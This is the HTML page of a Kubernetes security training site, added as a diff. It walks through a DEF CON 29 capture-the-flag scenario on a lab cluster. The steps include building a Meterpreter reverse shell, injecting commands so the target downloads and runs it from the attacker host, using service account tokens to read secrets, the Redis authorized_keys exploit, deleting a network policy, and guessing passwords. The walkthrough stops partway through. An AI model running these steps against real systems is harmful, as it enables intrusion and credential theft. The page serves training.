@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: DEF CON 29 Kubernetes CTF | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: DEF CON 29 Kubernetes CTF" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/kubernetes-ctf-dc2021/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/kubernetes-ctf-dc2021/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: DEF CON 29 Kubernetes CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: DEF CON 29 Kubernetes CTF","url":"http://0.0.0.0:10000/exercises/kubernetes-ctf-dc2021/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: DEF CON 29 Kubernetes CTF</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start up a fresh lxterminal by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter. Alternatively, use the hot key sequence below:</p>
+<pre><code>&lt;hold down Alt&gt;&lt;hit F2&gt;lxterminal&lt;HIT the enter key&gt;
+</code></pre></li>
+<li>
+<p>Start your Kubernetes cluster - we will use this one for all Kubernetes exercises except for the Cloud Attacks, Peirates and Node Attacks:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sync/bin/suspend-all-vms.sh
+/sync/bin/start-bustakube.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>SSH into the control plane node on the cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /sync/bustakube-node-key root@bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Start the CTF scenario:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/bustakube/Scenario-DEFCONCTF29/stage-scenario.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Create a directory for this exercise and switch into it:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> ~/ctf29
+<span class="nb">cd</span> ~/ctf29
+</code></pre></div></div>
+</li>
+<li>
+<p>Create a Meterpreter binary for 64-bit x86 Linux:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> linux/x64/meterpreter/reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span>10.23.58.30 <span class="nt">-f</span> elf <span class="nt">-o</span> mrsbin
+</code></pre></div></div>
+</li>
+<li>
+<p>Set up a web server to listen on tcp/9000.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 9000
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Let's start up a Metasploit console and run a multi/handler that matches the same IP address. Start by creating an RC file for this:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;multi-handler.rc
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 10.23.58.30
+set ExitOnSession false
+exploit -j
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Now run msfconsole, telling it to start by running those commands.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole <span class="nt">-r</span> multi-handler.rc
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+<pre><code>Hit Ctrl-Shift-t
+</code></pre></li>
+<li>
+<p>Run a TCP port scan of the first node's TCP ports that are reserved for node ports.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> <span class="nt">-p30000-32767</span> bustakube-node-1
+</code></pre></div></div>
+</li>
+<li>
+<p>Interact with the service that's running on TCP port 30080:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://bustakube-node-1:30080/
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe that you get a mysterious answer.  Here's the output on our test system:</p>
+<pre><code>/ is not a valid resource.
+</code></pre></li>
+<li>
+<p>Try putting a random useful word on the end of that URL, using -v to see error codes:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> http://bustakube-node-1:30080/admin
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe that you received a standard HTTP 404 error. Here's an excerpt of the output from our test system:</p>
+<pre><code>&lt; HTTP/1.1 404 Not Found
+&lt; Content-Type: text/html
+</code></pre></li>
+<li>
+<p>Let's assume that you ran dirbuster for a while, trying different words on the end of the URL until you found a request that didn't give you a HTTP 404 status code.  The one you found was for <code>/vent</code>.  Try that with curl.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://bustakube-node-1:30080/vent
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe the answer tells you that <code>/vent</code> takes a parameter called &quot;cmd,&quot; which sounds like &quot;command.&quot; Here's the output from our test system:</p>
+<pre><code>/vent requires a parameter of cmd
+</code></pre></li>
+<li>
+<p>Next, try passing a command in. We'll use &quot;id&quot;.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://bustakube-node-1:30080/vent?cmd<span class="o">=</span><span class="nb">id</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe that you're told that this parameter must be Base64-encoded. Here's the output from our test system:</p>
+<pre><code>cmd parameter must be Base64-encoded.
+</code></pre></li>
+<li>
+<p>Try Base64-encoding &quot;id&quot; and passing it as the value for <code>cmd</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">value</span><span class="o">=</span><span class="si">$(</span> <span class="nb">echo</span> <span class="s2">"id"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="si">)</span>
+curl http://bustakube-node-1:30080/vent<span class="se">\?</span><span class="nv">cmd</span><span class="o">=</span><span class="nv">$value</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe that you are running commands as root on the target.  Here's the output from our test system:</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+</code></pre></li>
+<li>
+<p>Let's try that again, but now let's make the command we run be one that makes the target pull down a copy of our Meterpreter.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">cmd</span><span class="o">=</span><span class="s1">'curl -o /mrsbin http://10.23.58.30:9000/mrsbin'</span>
+<span class="nv">value</span><span class="o">=</span><span class="si">$(</span> <span class="nb">echo</span> <span class="nv">$cmd</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="si">)</span>
+curl http://bustakube-node-1:30080/vent?cmd<span class="o">=</span><span class="nv">$value</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Check to make sure that the &quot;mrsbin&quot; file was retrieved and written to the filesystem:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">cmd</span><span class="o">=</span><span class="s1">'ls -l /mrsbin'</span>
+<span class="nv">value</span><span class="o">=</span><span class="si">$(</span> <span class="nb">echo</span> <span class="nv">$cmd</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="si">)</span>
+curl http://bustakube-node-1:30080/vent?cmd<span class="o">=</span><span class="nv">$value</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, have this <code>/vent</code> program make our binary executable and run it. We won't be getting another shell prompt in this tab right now, as this request will be continuing until the <code>mrsbin</code> program exists.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">cmd</span><span class="o">=</span><span class="s2">"chmod u+x /mrsbin ; /mrsbin"</span>
+<span class="nv">value</span><span class="o">=</span><span class="si">$(</span> <span class="nb">echo</span> <span class="nv">$cmd</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="si">)</span>
+curl http://bustakube-node-1:30080/vent?cmd<span class="o">=</span><span class="nv">$value</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Go back to the Metasploit console window, where you'll see the exploit connect - here's the output on our test system:</p>
+<pre><code>[*] Meterpreter session 1 opened (10.23.58.30:4444 -&gt; 10.23.58.42:38088) at 2022-08-05 17:17:30 -0400
+</code></pre></li>
+<li>
+<p>Interact with that session;</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 1
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a shell</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>Start bash -i in this to make it easier to use.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>List the current directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Read the contents of <code>HINT.txt</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>HINT.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's see what namespace this pod is in.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /run/secrets/kubernetes.io/serviceaccount/namespace
+</code></pre></div></div>
+</li>
+<li>
+<p>It looks like we're in the <code>joeys-vent</code> namespace. We have kubectl - let's set an alias for kubectl to use the service account token mounted in the pod.  Our alias is going to include <code>-n joeys-vent</code> in it, because the alias set up will read that same namespace file that we just read.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/token<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n </span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/namespace<span class="si">)</span><span class="s2">"</span> 
+</code></pre></div></div>
+</li>
+<li>
+<p>Get the secret:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret joeys-flag-floppy-disk
+</code></pre></div></div>
+</li>
+<li>
+<p>Just get the data part of the secret:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret joeys-flag-floppy-disk <span class="nt">-o</span> yaml | <span class="se">\</span>
+egrep <span class="nt">-A</span> 1 <span class="s1">'^data:'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Decode the &quot;flag&quot; item in that secret:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret joeys-flag-floppy-disk <span class="nt">-o</span> yaml | <span class="se">\</span>
+ egrep <span class="nt">-A</span> 1 <span class="s1">'^data:'</span> | <span class="nb">grep </span>flag | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>You'll find the secret contents look something like this:</p>
+<pre><code>joeys-floppy-disk-FLAG-b6e3f5a1-62dc-47e5-9a4d-6182f38812b8
+</code></pre></li>
+<li>
+<p>The HINT.txt file also said to find a Redis server without port scanning. Enumerate for a while if you like.  Eventually, you might decide to look for configmaps, which are used to send non-secret configuration information into a container:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get configmaps
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that there's a juicy one called <code>scoring-gibsons</code> - go read it.  This time, we'll get our kubectl output as json and parse it with jq, which has helpfully been installed in the container image:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get configmaps scoring-gibsons <span class="nt">-o</span> json | jq .data
+</code></pre></div></div>
+</li>
+<li>
+<p>Review the config map - you'll see these items (along with others) in the text - note - the IP addresses in our sample output here won't match yours.  If you're curious, the <code>sship</code> IP address is the IP address for a pod, so it will be within the IP range reserved for the pods on whichever node it is on.  On our test system, the three nodes have pod networks <code>10.32.0.0</code>,<code>10.36.0.0</code>, and <code>10.39.0.0</code>.  The <code>ip</code> IP address is for a Kubernetes service and so it's on the service IP network.</p>
+<pre><code>{
+  &quot;hint&quot;: &quot;ip is the IP address of a Redis server while port is the port for that Redis server&quot;,
+  &quot;ip&quot;: &quot;10.103.149.8&quot;,
+  &quot;port&quot;: &quot;45912&quot;,
+  &quot;sship&quot;: &quot;10.32.0.2&quot;
+}
+</code></pre></li>
+<li>
+<p>Parse the <code>ip</code> item out of the config map:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get configmaps scoring-gibsons <span class="nt">-o</span> json | jq <span class="nt">-r</span> <span class="s1">'.data.ip'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now store that IP in a variable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ip</span><span class="o">=</span><span class="si">$(</span>kubectl get configmaps scoring-gibsons <span class="nt">-o</span> json| jq <span class="nt">-r</span> <span class="s1">'.data.ip'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Ping the redis server via the <code>redis_cli</code> <code>ping</code> command:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis-cli <span class="nt">-h</span> <span class="nv">$ip</span> <span class="nt">-p</span> 45912 ping
+</code></pre></div></div>
+</li>
+<li>
+<p>Wow - we're able to run commands on the redis server without authentication. Read about what that means we can do to it, if you like:</p>
+<p><a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>
+</li>
+<li>
+<p>The summary of that article is that we can exploit Redis to get it to write to the filesystem of this container. Luckily, we'll find this container is also running an SSH server.</p>
+</li>
+<li>
+<p>Also, parse the <code>sship</code> out of the configmap:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">sship</span><span class="o">=</span><span class="si">$(</span>kubectl get cm scoring-gibsons <span class="nt">-o</span> json | jq <span class="nt">-r</span> <span class="s1">'.data.sship'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>You may have noticed that we just used <code>kubectl get cm</code> instead of <code>kubectl get configmaps</code>. How did we know that Kubernetes takes <code>cm</code> as an abbreviation? Kubernetes will tell you short names for resources that have them, like &quot;po&quot; for &quot;pods&quot;, &quot;cm&quot; for &quot;configmaps&quot;, and &quot;crd&quot; for &quot;customresourcedefinition&quot; if you run this command:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl api-resources
+</code></pre></div></div>
+</li>
+<li>
+<p>Try connecting to the <code>sship</code> IP address on port 22 with netcat (nc):</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nv">$sship</span> 22
+</code></pre></div></div>
+</li>
+<li>
+<p>Hit the enter key to get the SSH server to close the netcat session.</p>
+<pre><code>Hit the enter key
+</code></pre></li>
+<li>
+<p>Run <code>ssh-keygen</code> to begin the creation of an SSH key.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-t</span> RSA <span class="nt">-C</span> <span class="s2">"crack@crack"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Hit the enter key three times to finish creating this SSH key.</p>
+<pre><code>Hit the enter key
+Hit the enter key a second time
+Hit the enter key a third time
+</code></pre></li>
+<li>
+<p>Run the classic Redis exploit.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root/.ssh
+<span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat </span>id_rsa.pub <span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span>foo.txt
+<span class="nb">alias </span><span class="nv">rediscli</span><span class="o">=</span><span class="s2">"redis-cli -h </span><span class="nv">$ip</span><span class="s2"> -p 45912"</span>
+rediscli flushall
+<span class="nb">cat </span>foo.txt | rediscli <span class="nt">-x</span> <span class="nb">set </span>crackit
+rediscli config <span class="nb">set dir</span> /root/.ssh
+rediscli config <span class="nb">set </span>dbfilename <span class="s2">"authorized_keys"</span>
+rediscli save
+</code></pre></div></div>
+</li>
+<li>
+<p>Try to SSH into the container - this will work, but you'll see no prompt or even output for your commands. Don't worry.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-o</span> <span class="s2">"StrictHostKeyChecking=false"</span> root@<span class="nv">$sship</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Run <code>bash -i</code> to get a more friendly environment.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Nice! You now have remote code execution in a new pod, called &quot;cereal-redis&quot;. Check out what namespace it is in:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /run/secrets/kubernetes.io/serviceaccount/namespace
+</code></pre></div></div>
+</li>
+<li>
+<p>We're in a new namespace called <code>cereals-rainbow-books</code>! OK, next explore the filesystem, listing files in the / directory in reverse timestamp order:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lart</span> /
+</code></pre></div></div>
+</li>
+<li>
+<p>There's a <code>/data</code> directory that is a little unusual.  Check it out:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /data
+</code></pre></div></div>
+</li>
+<li>
+<p>It looks like we've found a HINT.txt file - let's see its contents:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /data/HINT.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Read the hint and get a FLAG:</p>
+<pre><code>Congratulations! You've made it to the cereal-rainbow-books namespace.
+
+First, grab your flag:  flag-cereal.
+
+Second, go check out the services in the phreaks-nynex-kingdom namespace.
+
+NOTE: this has two tricky bits...
+</code></pre></li>
+<li>
+<p>We'll have to use a new kubectl alias to use this pod's service account token:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/token<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n </span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/namespace<span class="si">)</span><span class="s2">"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Go get the flag!</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret flag-cereal <span class="nt">-o</span> yaml | egrep <span class="nt">-A</span> 1 <span class="s1">'^data'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Parse that secret</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret flag-cereal <span class="nt">-o</span> yaml | egrep <span class="nt">-A</span> 1 <span class="s1">'^data'</span> | <span class="se">\</span>
+ <span class="nb">grep </span>flag | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that the flag is similar to this:</p>
+<pre><code>cereals-rainbow-books-FLAG-b2a6325d-613e-4fc7-9a75-1fbbd4317662
+</code></pre></li>
+<li>
+<p>Let's explore the services in the phreaks-nynex-kingdom namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> phreaks-nynex-kingdom get services
+</code></pre></div></div>
+</li>
+<li>
+<p>Make things easier by locking the namespace to <code>phreaks-nynex-kingdom</code> with an alias:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/token<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n phreaks-nynex-kingdom"</span> 
+</code></pre></div></div>
+</li>
+<li>
+<p>Try to read the blade service - this will fail:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get service blade <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>So our current service account token isn't allow to get the content of a specific service. Let's ask what it can do in this namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>So we're allow to list services, but not request them one by one.  One the one hand, we could just ask for a list of all services as YAML, which will give us all the information about the blade service, but also about all the others:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get services <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>On the other hand, we can get what we need by just asking for the list in &quot;wide&quot; format and let <code>kubectl</code> do the parsing:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get services <span class="nt">-o</span> wide
+</code></pre></div></div>
+</li>
+<li>
+<p>There's one service called whats-the-password-rce and one called blade. If we read their labels, we see that blade sends its traffic to pods whose app labels are set to blade. We can look at that soon, but let's investigate the <code>whats-the-password-rce</code> service.</p>
+</li>
+<li>
+<p>Try to reach out to the whats-the-password-rce service. We've added a connection timeout here, since we know the connection won't be successful.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-k</span> <span class="nt">--connect-timeout</span> 5 <span class="se">\</span>
+ http://whats-the-password-rce.phreaks-nynex-kingdom.svc.cluster.local:46231
+</code></pre></div></div>
+</li>
+<li>
+<p>This connection timeout. The puzzle here for the CTF is to guess that there's a firewall rule here, created by a network policy.</p>
+</li>
+<li>
+<p>Let's look for network policies:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> phreaks-nynex-kingdom get networkpolicies
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that there is one network policy named <code>default-deny-all</code>. Here's the output from our test system:</p>
+<pre><code>NAMESPACE               NAME               POD-SELECTOR   AGE
+phreaks-nynex-kingdom   default-deny-all   &lt;none&gt;         9h
+</code></pre></li>
+<li>
+<p>We can learn more about that network policy with <code>describe</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> phreaks-nynex-kingdom describe networkpolicies
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that this network policy blocks all incoming network traffic to every pod in the <code>phreaks-nynex-kingdom</code> namespace. Here's en excerpt from the output on our test system:</p>
+<pre><code>PodSelector:     &lt;none&gt; (Allowing the specific traffic to all pods in this namespace)
+Allowing ingress traffic:
+  &lt;none&gt; (Selected pods are isolated for ingress connectivity)
+Not affecting egress traffic
+Policy Types: Ingress
+</code></pre></li>
+<li>
+<p>Let's try deleting the network policy!</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> phreaks-nynex-kingdom delete networkpolicy default-deny-all
+</code></pre></div></div>
+</li>
+<li>
+<p>It worked! Let's try our curl again:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-k</span> <span class="nt">--connect-timeout</span> 5 <span class="se">\</span>
+ http://whats-the-password-rce.phreaks-nynex-kingdom.svc.cluster.local:46231
+</code></pre></div></div>
+</li>
+<li>
+<p>You're asked for a password and command.  Here's the output from our test system:</p>
+<pre><code>/ requires two parameters: password and cmd
+</code></pre></li>
+<li>
+<p>For the command, we'll use &quot;id&quot;. For the password, let's try &quot;password&quot;.  Note: the URL is very long, so we're going to put it in a variable to make this easier to read:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">url</span><span class="o">=</span><span class="s2">"http://whats-the-password-rce.phreaks-nynex-kingdom:46231"</span>
+curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?cmd<span class="o">=</span><span class="nb">id</span><span class="se">\&amp;</span><span class="nv">password</span><span class="o">=</span>password
+</code></pre></div></div>
+</li>
+<li>
+<p>OK, so that got us an error message about an incorrect password.  Here's the output from our test system:</p>
+<pre><code>Password is not correct
+</code></pre></li>
+<li>
+<p>Notice that we used a shorter DNS name for the service this time. We used <code>whats-the-password-rce.phreaks-nynex-kingdom</code> instead of <code>whats-the-password-rce.phreaks-nynex-kingdom.svc.cluster.local</code>. It turns out the pods all have <code>svc.cluster.local</code> in their domain search list in <code>/etc/resolv.conf</code>.</p>
+</li>
+<li>
+<p>Let's try some of the different passwords from that the movie claimed were the most common: &quot;love&quot;, &quot;secret&quot;, and &quot;god&quot;.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?cmd<span class="o">=</span><span class="nb">id</span><span class="se">\&amp;</span><span class="nv">password</span><span class="o">=</span>love
+curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?cmd<span class="o">=</span><span class="nb">id</span><span class="se">\&amp;</span><span class="nv">password</span><span class="o">=</span>secret
+curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?cmd<span class="o">=</span><span class="nb">id</span><span class="se">\&amp;</span><span class="nv">password</span><span class="o">=</span>god
+</code></pre></div></div>
